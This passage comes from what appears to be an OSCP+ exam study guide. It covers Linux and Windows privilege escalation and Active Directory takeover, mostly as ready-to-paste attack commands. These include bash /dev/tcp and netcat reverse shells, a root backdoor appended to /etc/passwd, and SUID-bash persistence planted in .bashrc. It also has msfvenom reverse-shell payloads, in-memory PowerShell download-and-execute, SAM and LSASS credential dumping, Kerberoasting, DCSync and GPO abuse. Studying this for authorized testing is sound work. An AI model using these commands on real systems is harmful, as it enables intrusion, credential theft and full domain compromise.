touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh x.sh'      # next tar run executes x.sh as root → SUID bash
```

## [LINUX-WRITABLE]  writable sensitive files
- Writable `/etc/passwd` → add your own root user:
  `echo 'r00t:$(openssl passwd -1 -salt a pass):0:0::/root:/bin/bash' >> /etc/passwd` then `su r00t` (password: `pass`).
- Writable `/etc/shadow` → replace root's hash with one you know. Writable `/etc/sudoers` (or `sudoers.d`) → grant yourself NOPASSWD. Writable systemd service/unit → root via systemd.

## [LINUX-BASHRC]  writable shell-startup files
**What it is:** files like `~/.bashrc`, `~/.bash_profile`, `~/.profile` (and global ones in `/etc/profile.d/`) run **every time that user opens a shell**. If one belongs to a higher-priv user but is **writable by you**, append a payload and it fires as *them* next time they log in.
```bash
find / \( -name ".bashrc" -o -name ".bash_profile" -o -name ".profile" \) -writable 2>/dev/null
ls -la /etc/profile /etc/bash.bashrc /etc/profile.d/
# if root's file is writable:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /root/.bashrc   # then, after root logs in:  /tmp/rootbash -p
echo 'bash -i >& /dev/tcp/<IP>/443 0>&1' >> /home/<user>/.bashrc              # reverse shell as that user
```
**Also loot** your own and others' `.bashrc`/`.profile` for aliases and `export`ed credentials. (Different from `~/.bash_history`, which is *reading* past commands for creds — `[LINUX-CREDS]`.)

## [LINUX-SYSTEMD]  services / timers
A writable `.service` or `.timer` file, or a root service that points to a binary you can overwrite → edit `ExecStart` to your payload, then `systemctl restart <svc>` (if allowed) or wait for the timer.

## [LINUX-NFS]  no_root_squash
`showmount -e $IP` shows an export with **`no_root_squash`**. On **your own** machine (as root): mount that export, drop in a SUID-root shell binary (compile a tiny C program that does `setuid(0); execl("/bin/bash", ...)`); then on the target, run it as your low-priv user → root.

## [LINUX-DOCKER-LXD]  container / group escapes
- In the **docker** group: `docker run -v /:/mnt -it alpine chroot /mnt sh` → you're root on the host's disk.
- In the **lxd/lxc** group: import an alpine image and launch a privileged container with the host `/` mounted → root `[LOOK-UP]`.
- Inside a container (there's a `/.dockerenv`): check `capsh --print`, mounted host paths, and `/var/run/docker.sock` (→ spawn a privileged container).

## [LINUX-CREDS]  hunting creds & keys (also `[CREDENTIALS-SOURCES]`)
`~/.bash_history`, `~/.ssh/id_*` (reuse across users/hosts), config files with DB creds, `.env`, `/var/www/**`, backups, `find / -name "*.kdbx"` (KeePass), mounted shares, app dirs in `/opt` and `/srv`, `mysql -u root` with a blank password, a `.git` folder in the web root.

## [LINUX-KERNEL]  kernel exploits (LAST resort)
**Detect:** `uname -a`, `/etc/os-release`; `searchsploit linux kernel <ver>`; the tool `linux-exploit-suggester2`.
**Warning:** kernel exploits can **crash the box** (forcing a revert) → only try after you've exhausted everything else. Match the exact kernel + distro + architecture.
**Common ones:** DirtyCOW (old), **DirtyPipe (kernels 5.8–5.16.11)**, PwnKit (pkexec — not the kernel, but nearly universal), OverlayFS variants, Sudo Baron Samedit.

## [LINUX-LOCAL-ENUM]  "check X → run this" table (copy-paste after you get a shell)
```
Who am I          id ; whoami ; groups
OS / kernel       uname -a ; cat /etc/os-release        (→ linux-exploit-suggester)
Users             cat /etc/passwd ; ls -la /home        (accounts with a login shell = real users)
sudo rights       sudo -l                               (the #1 quick win)
SUID / SGID       find / -perm -4000 -type f 2>/dev/null ; find / -perm -2000 -type f 2>/dev/null
Capabilities      getcap -r / 2>/dev/null
Cron / timers     crontab -l ; cat /etc/crontab ; ls -la /etc/cron.* ; systemctl list-timers ; pspy
Running procs     ps aux --forest                       (an unusual process → look in its folder)
Listening ports   ss -tlnp   (or netstat -tulpn)        (127.0.0.1-only = a pivot lead)
Writable stuff    find / -writable -not -path "/proc/*" 2>/dev/null | grep -vE '^/(sys|run|tmp|dev)'
Network           ip a ; ip route ; arp -a
Mounts/creds      mount ; cat /etc/fstab
Loot              ls -la ~/.ssh ; cat ~/.bash_history ; env ; find / -name "*.kdbx" 2>/dev/null
```
**🚩 flag / creds hunt:**
```bash
find / -iname '*flag*' 2>/dev/null
grep -rniE 'flag\{|OS\{|password|secret' /home /var/www /opt /etc 2>/dev/null
```

## [LINUX-PRIVESC-MANUAL]  full manual checklist (when linpeas is unavailable or misses it)
```bash
# 🚩 hunt for a flag / creds anywhere:
find / -iname '*flag*' 2>/dev/null ; grep -rniE 'flag\{|OS\{|password' /home /var/www /opt 2>/dev/null
id; sudo -l; uname -a; cat /etc/os-release       # who am I + sudo rights + kernel/OS (the first 4 checks)
find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null   # SUID / SGID → GTFOBins
getcap -r / 2>/dev/null                           # capabilities (cap_setuid on python/perl = root)
cat /etc/crontab; ls -la /etc/cron*; systemctl list-timers   # scheduled jobs (writable = root)
find / -writable -not -path "/proc/*" 2>/dev/null | grep -vE '^/(sys|run|tmp|dev)'   # writable files root touches
cat /etc/passwd; ls -la /home/*; find / -name "*.kdbx" -o -name "id_rsa" 2>/dev/null   # users + SSH/KeePass loot
history; cat ~/.bash_history 2>/dev/null; env     # command history + env vars (passwords leak here)
ss -tlnp; ip a; arp -a                            # internal services / pivot leads
ps aux --forest                                   # root processes → target them (pspy for timing)
mount; cat /etc/fstab                             # nfs/no_root_squash, creds in fstab
```

## [COMMON-RABBIT-HOLES linux-privesc]
- Trying kernel exploits first (they should be *last*). Chasing every SUID (most are standard/harmless). Cracking a hash you don't actually need. Drowning in linpeas noise. A "writable" file that's really in `/proc` or `/tmp` and useless.

---

# [WINDOWS-PRIVESC]  getting SYSTEM on Windows

## [WINDOWS-PRIVESC-QUICK]  first 60 seconds on any Windows shell  (one screen)
```cmd
whoami /all                              :: [MUST-MEMORIZE] your user, groups, AND privileges — all at once
whoami /priv                             :: the privileges list — SeImpersonate? SeBackup? (these are gold)
systeminfo                               :: OS version/build + installed patches (kernel-exploit hints)
net user %username% & net localgroup administrators
cmdkey /list & dir C:\ & net user
:: automate:
.\winPEASx64.exe > wp.txt                :: (or PowerUp / Seatbelt)
```
**Check in order:** `whoami /priv` (SeImpersonate/SeBackup are near-instant wins) → service/registry permissions → unquoted service paths → AlwaysInstallElevated → saved creds → autologon → **kernel (last)**.

## [WINPEAS-WORKFLOW]
1. Transfer winPEAS (`winPEASx64.exe`; use the `.bat` or PowerShell variant if AV blocks the exe). Save the output.
2. Read the RED highlights: privileges, service misconfigs, unquoted paths, AlwaysInstallElevated, stored creds, autologon.
3. Confirm each by hand (winPEAS over-reports on service permissions). Run **PowerUp** (`Invoke-AllChecks`) and/or **Seatbelt** for a second opinion.

## [WINDOWS-TOKENS]  abusing privileges (the fastest wins)  → `[TECH-TOKENS]`
**What it is:** Windows accounts hold "privileges." A few of them can be turned directly into SYSTEM. **Always check `whoami /priv` first** — this is the most common Windows privesc on OSCP.
**Detect:** `whoami /priv`.
**The valuable ones and how to use them:**
- **SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege** (common on service accounts, IIS, MSSQL) → a **"Potato"** attack → SYSTEM:
  - `PrintSpoofer64.exe -i -c cmd` (or `-c "nc.exe <IP> 443 -e cmd"`).
  - `GodPotato -cmd "cmd /c whoami"` (modern; works on Server 2012–2022).
  - `JuicyPotatoNG` / `RoguePotato` (older variants) `[LOOK-UP]`.
- **SeBackupPrivilege / SeRestorePrivilege** → read any file: back up the SAM+SYSTEM registry hives (`reg save`) → `secretsdump` → the admin's hash; or copy `NTDS.dit` on a Domain Controller.
- **SeTakeOwnershipPrivilege** → take ownership of a sensitive file/binary → replace it.
- **SeDebugPrivilege** → dump LSASS memory (mimikatz/procdump) → creds.
- **SeLoadDriverPrivilege** → load a vulnerable driver `[LOOK-UP]`.
**Verify:** `whoami` = `nt authority\system` (or a machine account like `secura\dc01$` on a DC — same power, see gotchas).

### [POTATO-GOTCHAS]  when PrintSpoofer/GodPotato "works" but you get nothing (battle-tested)
Real problems you WILL hit, and the exact fixes:
- **`-i` (interactive) fails:** `CreateProcessAsUser() failed... retrying with CreateProcessWithTokenW()` → `[!] CreateProcessWithTokenW() isn't compatible with option -i`. The fallback token method can't spawn an interactive prompt. **FIX:** drop `-i`, use `-c "<command>"` instead (it still runs as SYSTEM).
- **`-c "whoami"` runs but prints NOTHING:** with `CreateProcessWithTokenW`, the child's output doesn't come back to your shell. It *did* run — you just can't see it. **FIX — two options:**
  1. **Reverse shell (best — gives you an interactive SYSTEM shell):** `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KaliIP> LPORT=443 -f exe -o sh.exe`, transfer it, then `.\ps.exe -c "C:\path\sh.exe"` → catch it on `nc -lvnp 443`. (If Defender eats the msfvenom exe on a DC, use the file trick below.)
  2. **Redirect the output to a file you can read:** `.\ps.exe -c "cmd /c <command> > C:\Users\<you>\Desktop\o.txt & icacls C:\Users\<you>\Desktop\o.txt /grant <you>:F"` then `type` it. **Write to your OWN profile, not `C:\Users\Public`** — Public often has inherited *deny* rules; the `icacls /grant` makes the SYSTEM-created file readable by you.
- **You become `MACHINE$` instead of `nt authority\system`:** e.g. `secura\dc01$`. On the DC that computer account is SYSTEM-equivalent locally — full access, don't panic.
- **`type C:\Users\Administrator\Desktop\proof.txt` → "cannot find the path":** the admin profile is often renamed **`Administrator.DC01`** (or `Administrator.<DOMAIN>`) on a DC. **FIX:** `dir C:\Users` to see the real names, or hunt: `where /r C:\ proof.txt` → then `type <full path>`.
- **certutil download fails "CANNOT_CONNECT" (0x80072efd):** the URL must point at **YOUR Kali `tun0` IP** with `python3 -m http.server 80` running — never a victim's IP. Get your IP with `ip addr show tun0`.

## [WINDOWS-SERVICES]  service misconfigurations
**What it is:** Windows "services" are background programs, usually running with high privileges. If you can swap the program a service runs, or change its config, your code runs with those privileges.
**Detect:** PowerUp `Invoke-AllChecks`; `accesschk.exe -uwcqv "user" *`; winPEAS.
- **Unquoted service path:** `wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"` → a path with spaces, no quotes, and a writable folder along the way. **Exploit:** place `C:\Program.exe` (in the writable segment) → restart the service → it runs as the service account.
- **Writable service binary:** `sc qc <svc>`; if you can overwrite the EXE → replace it with your payload → restart. `sc config <svc> binPath= "C:\temp\rev.exe"` (if you can change config) then `sc start <svc>`.
- **Weak service config permissions:** `sc config <svc> binPath= "cmd /c net localgroup administrators <you> /add"` → `sc stop/start`.
- **DLL hijacking:** a service loads a missing DLL from a writable folder → drop a malicious DLL `[LOOK-UP]`.
**Verify:** a new admin / SYSTEM shell after the restart. **Troubleshoot:** you need restart rights (`sc start` denied → does it auto-restart, or can you `shutdown /r`?); `binPath=` needs a space after the `=`.

## [WINDOWS-REGISTRY]  registry-based
- **AlwaysInstallElevated:** if both `HKLM` and `HKCU` have `...\Installer\AlwaysInstallElevated = 1`, any `.msi` you install runs as SYSTEM.
  ```cmd
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi -o x.msi
  msiexec /quiet /qn /i x.msi
  ```
- **Writable Autorun/Run keys** → drop a payload for the next admin login.
- **Autologon creds:** `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` → `DefaultUserName` / `DefaultPassword` in cleartext.
- **Weak registry service perms** (writable `ImagePath`) → point it at your payload.

## [WINDOWS-CREDS]  credential hunting  → `[CREDENTIALS-SOURCES]`
```cmd
cmdkey /list                          :: saved creds → runas /savecred /user:X cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   :: autologon password
dir /s /b C:\*unattend.xml C:\*sysprep.inf C:\*.kdbx C:\*.config 2>nul
findstr /si password *.xml *.ini *.txt *.config          :: search a folder of interest for "password"
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
:: with admin — dump hashes:
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM sys.hive
:: then on Kali:  secretsdump.py -sam sam.hive -system sys.hive LOCAL
```
- **runas with a saved cred:** `runas /savecred /user:admin "cmd /c <payload>"`.
- Also: **DPAPI**, **LSASS** (mimikatz `sekurlsa::logonpasswords`, or `procdump -ma lsass.exe` then dump offline), Wi-Fi/vault creds.

## [WINDOWS-STARTUP]  startup / scheduled tasks
- A writable **Startup folder**, or a **scheduled task** that runs as admin with a binary you can overwrite → replace/drop your payload.
- `schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User"` → find admin tasks with weak binary permissions.

## [WINDOWS-INSTALLED]  installed software (find a vulnerable app)
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s   :: 32-bit apps — don't miss this!
```
Also `dir "C:\Program Files"` and `"C:\Program Files (x86)"`. A vulnerable version → `searchsploit <product> <version>` → local privesc (`[EXPLOIT-RESEARCH]`).

## [WINDOWS-PROCESSES]  running processes — find the non-standard one
```powershell
Get-Process | Select Name,Id,Path | Sort Name
Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath,CommandLine   # includes the command line
# surface anything NOT running from C:\Windows (i.e. custom software):
Get-Process | ? { $_.Path -and $_.Path -notlike "C:\Windows\*" } | Select Name,Path
```
**Why:** a process running from `C:\Users\`, `C:\Temp`, `C:\Tools`, or an odd folder = **custom software** → check whether you can overwrite its EXE (→ `[WINDOWS-SERVICES]`) and loot its folder for creds/configs/flags (`Get-ChildItem <dir> -Recurse -Force`). This is the Windows version of Linux's `ps aux --forest`.

## [WINDOWS-KERNEL]  kernel/OS exploits (LAST resort)
**Detect:** `systeminfo` → feed it to **Windows Exploit Suggester** (`wesng`); note missing hotfixes + the build number.
**Common (must match the build):** older systems → MS16-032, MS15-051, MS16-135. Prefer token/service methods first — kernel exploits risk crashing the box.

## [POWERSHELL]  ⚡ the Windows PowerShell commands you actually type
```powershell
# launch flags (prepend to any payload):
powershell -nop -w hidden -ep bypass -c "<command>"    # no-profile, hidden window, bypass execution policy
powershell -enc <base64-UTF16LE>                        # build with: echo -n '<ps>'|iconv -t UTF-16LE|base64 -w0

# download (target pulls from your Kali's python3 -m http.server) → [FILETRANSFER-QUICK]:
IWR http://<IP>/f -OutFile C:\Windows\Temp\f            # Invoke-WebRequest
(New-Object Net.WebClient).DownloadFile('http://<IP>/f','C:\Windows\Temp\f')   # works on OLD PowerShell too
IEX(New-Object Net.WebClient).DownloadString('http://<IP>/x.ps1')   # download + run IN MEMORY (never touches disk)
[Net.ServicePointManager]::SecurityProtocol='Tls12'     # if you get TLS/download errors

# enumerate:
Get-LocalUser ; Get-LocalGroupMember Administrators
Get-Service | ? {$_.Status -eq 'Running'} | Select Name,DisplayName
Get-ScheduledTask | ? {$_.State -eq 'Ready'}
Get-ChildItem C:\ -Recurse -Force -EA SilentlyContinue -Include *.kdbx,*.config,*flag*
Select-String -Path C:\Users\*\* -Pattern 'password|OS\{' -List -EA SilentlyContinue

# run as another user / remote (→ [AD-DOUBLEHOP]):
$p=ConvertTo-SecureString 'PASS' -AsPlainText -Force
$c=New-Object System.Management.Automation.PSCredential('DOMAIN\user',$p)
Invoke-Command -ComputerName host2 -Credential $c -ScriptBlock { whoami }
```
> Reverse shells + `Invoke-ConPtyShell` (a real interactive TTY) are in `[SHELL-WINDOWS]` / `[SHELL-STABILIZE]`.

## [WIN-LOCAL-ENUM]  "check X → run this" table (copy-paste after you get a shell)
```
OS / patches      systeminfo                                   (→ wesng for kernel exploits)
Who am I          whoami /all                                  (user, groups, PRIVILEGES together)
Users / groups    net user | Get-LocalUser ; net localgroup administrators
Privileges        whoami /priv                                 (SeImpersonate? SeBackup?)
Installed apps    reg query "HKLM\...\Uninstall" /s ; +WOW6432Node for 32-bit   [WINDOWS-INSTALLED]
Running processes Get-Process | Select Name,Id,Path            [WINDOWS-PROCESSES]
Services          sc query | Get-Service | wmic service get name,pathname,startmode
Scheduled tasks   schtasks /query /fo LIST /v
Network / ports   netstat -ano | ipconfig /all | route print | arp -a
Stored creds      cmdkey /list | reg query "HKLM\...\Winlogon"      [WINDOWS-CREDS]
PowerShell hist   type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
**🚩 Hunt for a flag / creds anywhere:**
```cmd
dir /s /b C:\*flag*.txt 2>nul
findstr /s /i "OS{ flag password" C:\Users\*.txt 2>nul
```
```powershell
Get-ChildItem C:\ -Recurse -Include *flag*,*.txt -EA SilentlyContinue | Select FullName
Select-String -Path C:\Users\*\* -Pattern 'OS\{|flag\{' -List -EA SilentlyContinue
```

## [WINDOWS-PRIVESC-MANUAL]  checklist
```cmd
whoami /all & whoami /priv & systeminfo & hostname       :: identity + PRIVILEGES + OS build
net user & net localgroup administrators & net accounts  :: local users, admins, password policy
cmdkey /list & reg query "HKLM\...\Winlogon"             :: saved creds + autologon password
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   :: both =1 → .msi as SYSTEM
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\windows"  :: UNQUOTED service paths
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As"   :: admin scheduled tasks
dir /s /b C:\*.config C:\*unattend* C:\*.kdbx 2>nul       :: config/unattend/KeePass → creds
netstat -ano & ipconfig /all & route print & arp -a       :: internal services / other subnets (pivot leads)
```

## [COMMON-RABBIT-HOLES windows-privesc]
- Jumping to kernel exploits before checking `whoami /priv`. Chasing a service you can't restart. Cracking a hash when Pass-the-Hash already works. AV eating your winPEAS.exe (use the PS/bat variant or go manual). An unquoted path where no folder along the way is writable (a false positive).

---
*End Volume 4. Next: Volume 5 — Active Directory (attacking a Windows domain) and pivoting between networks.*


# OSCP+ KNOWLEDGE BASE — VOLUME 5
## ACTIVE DIRECTORY (breaking a Windows domain) + PIVOTING

> **Read this box first — it's the most important 40 points on the exam.**
>
> **What is Active Directory (AD)?** In companies, Windows computers and users aren't managed one-by-one — they're joined into a **domain** run by a central server called the **Domain Controller (DC)**. The DC holds every user, password, group, and computer. **Own the DC and you own everything.** The exam's AD set is 3 chained machines worth 40 points, all-or-nothing.
>
> **"Assumed breach":** the exam hands you one low-privilege domain username+password to start (you don't have to find the first foothold). Your job: use that to enumerate the domain, steal more credentials, hop from machine to machine, and eventually take over the DC.
>
> **Placeholders:** `$DC` = the Domain Controller's IP · `$DOMAIN` = the domain name (like `corp.local`) · `$U`/`$P` = a username/password you have · `$H` = an NTLM password hash · `<IP>` = your Kali IP.
>
> **⏰ Always fix the clock first for Kerberos.** AD's login system (Kerberos) refuses if your clock differs from the DC's by more than 5 minutes. Symptom: `KRB_AP_ERR_SKEW`. Fix: `sudo ntpdate $DC` (or `sudo rdate -n $DC`).
>
> **The whole AD game in one loop:** enumerate → map with BloodHound → get a credential → see what it unlocks → move to the next machine → repeat → reach the DC.

---

# [AD-QUICK]  the core AD commands  (one screen)
```bash
# 1) Test a credential and see WHERE it's admin ("Pwn3d!" = local admin on that host):
nxc smb <hosts> -u $U -p $P
# 2) Dump users/groups/policy/shares from the DC:
nxc smb $DC -u $U -p $P --users --groups --pass-pol --shares
# 3) Collect the whole domain map for BloodHound (do this EARLY):
bloodhound-python -u $U -p $P -d $DOMAIN -ns $DC -c all --zip
# 4) The two "free" credential attacks (see below):
impacket-GetNPUsers  $DOMAIN/ -dc-ip $DC -no-pass -usersfile users.txt   # AS-REP roast (needs NO password)
impacket-GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC                     # Kerberoast (needs any one password)
# 5) Spray a working cred across the whole subnet, then log in where you're admin:
nxc smb <subnet> -u $U -p $P --continue-on-success
evil-winrm -i <host> -u $U -p $P            # get a shell (WinRM), OR:
impacket-psexec $DOMAIN/$U:$P@<host>        # get a SYSTEM shell (SMB)
```

---

# [AD-ENUM]  enumerating the domain
**What you need:** network reach to the DC, and ideally one domain credential (the exam gives you one).
**Confirm it's a domain:** ports 88/389/445/135 open; `nxc smb $DC` prints the domain + hostname.
**Commands (with a credential):**
```bash
nxc smb  $DC -u $U -p $P --users                 # list every domain user
nxc smb  $DC -u $U -p $P --groups --pass-pol --shares   # groups (find the admins) + lockout policy + shares
nxc ldap $DC -u $U -p $P --users --groups        # same via LDAP — also shows 'description' fields (passwords hide there!)
ldapdomaindump -u "$DOMAIN\\$U" -p $P $DC -o ldd/  # dump everything to browsable HTML/JSON files
# with NO credential — pull usernames by cycling ID numbers:
nxc smb $DC -u '' -p '' --rid-brute
impacket-lookupsid $DOMAIN/$U:$P@$DC              # the domain's SID + every account:RID
# find attackable accounts in one shot:
nxc ldap $DC -u $U -p $P --kerberoasting kr.txt --asreproast ar.txt --trusted-for-delegation
```
**What in the output matters:** the **user list** (→ spray/roast), the **computer list**, **group memberships** (who are the admins?), the **password policy** (the lockout threshold tells you how safely you can spray), accounts with **SPNs** (Kerberoastable), accounts that **"do not require pre-auth"** (AS-REP roastable), and any **`description`** fields (admins hide passwords there).
**Next:** run BloodHound, do the roasts, spray your cred.

## [AD-USER]  building a username list + the password policy
- **Build a user list** from: LDAP/RID cycling, `enum4linux-ng`, SMTP enumeration, Kerbrute (`kerbrute userenum -d $DOMAIN --dc $DC users.txt`), the website, or files in shares. Common name formats: `first.last`, `flast`, `f.last`.
- **Check the password policy:** `nxc smb $DC -u $U -p $P --pass-pol`. The **lockout threshold** is how many wrong guesses lock an account. Spray *fewer* than that per time-window, then wait for the reset — or you'll lock people out and tip off the defender.

## [AD-SID]  Security Identifiers (SIDs) — the ID number behind every account
**What it is:** every user/group/computer in AD has a unique ID called a SID, like `S-1-5-21-3623811015-3361044348-30300820-1013`. The long middle part is the **domain's** ID; the **last number (the "RID")** identifies the specific account.
**RIDs worth knowing** (the last number):
```
500 = Administrator   501 = Guest   502 = krbtgt (the Kerberos master account)
512 = Domain Admins   513 = Domain Users   519 = Enterprise Admins   544 = local Administrators
```
**Why you care:** the **domain SID** (everything before the last number) is needed to forge "Golden Tickets" (`[KERBEROS-QUICK]`). Get it with `impacket-lookupsid`. On a shell: `whoami /user`. An RID ≥ 1000 = a normal created account; < 1000 = a built-in one.

## [AD-CREDENTIALS]  getting your first (or next) credential
In rough order of ease: **AS-REP roast (no creds needed) → spray weak/reused passwords → Kerberoast (needs any cred) → loot shares (GPP passwords, scripts, configs) → dump hashes from a machine you own → abuse an ACL "edge".**

## [AD-KERBEROAST]  Kerberoasting  → `[THINK-SPN]`
**What it is:** "service accounts" in AD have something called an SPN. **Any** valid domain user can ask the DC for a ticket for a service account — and that ticket is encrypted with the service account's password. You crack it offline to recover the password. Service accounts are often powerful.
**You need:** just one domain credential.
```bash
impacket-GetUserSPNs -request $DOMAIN/$U:$P -dc-ip $DC -outputfile tgs.txt   # request the tickets → hashes into tgs.txt
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule   # crack (13100 = Kerberoast)
```
**You get:** the service account's cleartext password (if it's weak). **Next:** spray it everywhere; check that account in BloodHound (often an admin).
**Troubleshoot:** clock skew → `ntpdate $DC`; no SPN accounts → nothing to roast; won't crack → strong password, move on. **Targeted Kerberoast:** if you have `GenericWrite` on a user, you can *set* an SPN on them, roast, then remove it `[LOOK-UP]`.

## [AD-ASREP]  AS-REP roasting
**What it is:** some accounts are misconfigured with "Kerberos pre-authentication" turned off. For those, **anyone** — no password needed — can request a chunk of data encrypted with the user's password, then crack it offline.
**You need:** just a list of usernames.
```bash
impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule    # crack (18200 = AS-REP)
```
**You get:** the cleartext of any weak-password account. **Next:** spray it + look that user up in BloodHound.

## [AD-ACL]  abusing object permissions (BloodHound "edges") — the AD mid-game
**What it is:** AD lets one account hold special rights over another (reset their password, add them to a group, etc.). If you control an account that has a dangerous right over a more powerful account, you take that account over — then repeat, climbing toward Domain Admin. **BloodHound draws these as arrows ("edges").** Here's what each edge means and how to abuse it:

| Edge (BloodHound name) | What it means | How to abuse it |
|---|---|---|
| **GenericAll** (on a user) | total control of that user | force-change their password, then log in as them |
| **GenericAll** (on a computer) | total control of that computer | RBCD or "shadow credentials" → authenticate as it |
| **GenericAll / Owns** (on a group) | control the group | add yourself to the group |
| **ForceChangePassword** | reset their password without the old one | set a new password, log in as them |
| **GenericWrite / WriteProperty** (user) | edit their attributes | set an SPN → targeted Kerberoast |
| **WriteDACL** | rewrite the permissions list | grant yourself GenericAll, then abuse it |
| **WriteOwner** | become the owner | set owner=you → grant GenericAll → abuse |
| **AddMember / AddSelf** | add members to a group | add yourself to a privileged group |
| **AllExtendedRights** (on domain) | includes DCSync | DCSync the whole domain |
| **AddKeyCredentialLink** | write a key credential | "Shadow Credentials" → get the account's NT hash |

**Commands (run these from Kali):**
```bash
# force-change a user's password (GenericAll / ForceChangePassword):
net rpc password "targetuser" "NewP@ss1" -U "$DOMAIN"/"$U"%"$P" -S $DC
bloodyAD -u $U -p $P -d $DOMAIN --host $DC set password targetuser 'NewP@ss1'
# add yourself to a group (GenericAll / AddMember on the group):
bloodyAD -u $U -p $P -d $DOMAIN --host $DC add groupMember "Target Group" $U
# WriteOwner → make yourself owner → grant yourself full control (a chain):
owneredit.py -action write -new-owner $U -target targetuser "$DOMAIN"/"$U":"$P"
dacledit.py  -action write -rights FullControl -principal $U -target targetuser "$DOMAIN"/"$U":"$P"
# Shadow Credentials (AddKeyCredentialLink) → get an NT hash:
certipy shadow auto -u $U@$DOMAIN -p $P -account targetuser
```
**You get:** control of the target account (its new password, hash, or ticket) → repeat up the graph.
**Troubleshoot:** password-complexity rules on force-change; clock skew for the certificate-based ones.

## [AD-DCSYNC]  domain takeover — steal every password hash
**What it is:** Domain Controllers replicate their database to each other. If your account has the "replication" right (Domain Admins have it, and BloodHound flags anyone else who does as "DCSync"), you can *pretend to be a DC* and ask for **all** password hashes — including the built-in Administrator and the `krbtgt` master key.
```bash
impacket-secretsdump $DOMAIN/$U:$P@$DC                          # dump ALL hashes (needs replication rights)
impacket-secretsdump -just-dc-user krbtgt $DOMAIN/$U:$P@$DC     # just krbtgt (→ Golden Ticket)
```
**You get:** the Administrator's NTLM hash (→ Pass-the-Hash into the DC), the `krbtgt` hash (→ forge Golden Tickets), and every user's hash. **This is game over.**

## [AD-LATERAL]  moving to another machine (with a working credential/hash)
**You need:** creds/hash that are **local admin** on the target (`nxc smb <host> -u.. -p..` shows `(Pwn3d!)`).
```bash
evil-winrm -i <host> -u $U -p $P                 # interactive shell over WinRM (if the account has WinRM rights)
evil-winrm -i <host> -u $U -H $H                 # same, but using a hash (Pass-the-Hash)
impacket-psexec  $DOMAIN/$U:$P@<host>            # SYSTEM shell over SMB (reliable but "loud")
impacket-wmiexec $DOMAIN/$U:$P@<host>            # quieter command execution
nxc smb <host> -u $U -p $P -x "whoami"           # run one quick command
nxc smb <host> -u $U -H $H --sam --lsa           # dump that host's stored creds
```
> **Pass-the-Hash (PtH):** log in with the NTLM *hash* instead of the password — `-hashes :$H` (impacket) or `-H $H` (nxc/evil-winrm). You often never need to crack it.
**On each new host:** loot its creds (secretsdump / LSASS) → new creds → repeat toward the DC.

## [AD-GPO]  abusing Group Policy → SYSTEM on every linked machine (even the DC)
**What it is:** Group Policy Objects (GPOs) push settings and scripts to groups of machines. If you have **write access to a GPO** (a BloodHound edge onto a GPO object), you can make it run a task as **SYSTEM** on every machine the GPO applies to — and if it's linked to the DC, that's domain compromise.
```bash
# Windows (SharpGPOAbuse) — add yourself as a local admin on the affected machines:
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName "<GPO Name>"
# Linux (pyGPOAbuse):
pygpoabuse '<DOMAIN>/<user>:<pass>' -gpo-id <GUID> -command 'net localgroup administrators <you> /add'
gpupdate /force     # trigger it now (or wait ~90 min for the automatic refresh)
```
**You get:** SYSTEM / local admin on the linked machines → then DCSync (`[AD-DCSYNC]`) → domain compromise.
**Troubleshoot:** the GPO must be *linked* to an OU containing your target (an unlinked GPO does nothing).

## [AD-DELEGATION]  Kerberos delegation (recognise + basic abuse)
- **Unconstrained delegation:** if you take over such a host, you can trick a DC/admin into authenticating to it and capture their ticket → impersonate them `[LOOK-UP]`.
- **Constrained delegation:** `getST.py -impersonate administrator ...` → impersonate any user to the allowed service.
- **RBCD (Resource-Based Constrained Delegation):** if you can write to a computer object, add a machine account you control as "allowed to act", then impersonate → local admin on that computer `[LOOK-UP]`.

## [AD-BLOODHOUND]  the map that finds your path  → `[THINK-DOMAINUSER]`
**What it is:** BloodHound collects all the users, groups, computers, and permissions, then draws a graph so you can see the **shortest path to Domain Admin** instead of guessing.
```bash
bloodhound-python -u $U -p $P -d $DOMAIN -ns $DC -c all --zip     # collect from Kali (do it as soon as you have any cred)
# or on a Windows host:  SharpHound.exe -c all   → copy the zip to Kali
```
**Then:** open the BloodHound GUI, import the zip, mark your owned accounts as "Owned", and run the built-in queries "Shortest paths to Domain Admins" and "Shortest paths from Owned". Each **arrow** maps to an abuse recipe in `[AD-ACL]`.
**Troubleshoot:** collection fails → clock skew, wrong `-ns`/`-d`, or LDAP signing; GUI import errors → match the collector and GUI versions.

## [AD-ATTACK-PATH]  how a typical exam chain looks
```
start: assumed-breach credential
 → run BloodHound + Kerberoast + AS-REP + spray
 → crack a service/user password → reuse it → become local admin on a host
 → secretsdump that host → more hashes/creds → BloodHound "from owned"
 → abuse an ACL edge (GenericAll / WriteDACL / Shadow-Creds) up to a privileged user
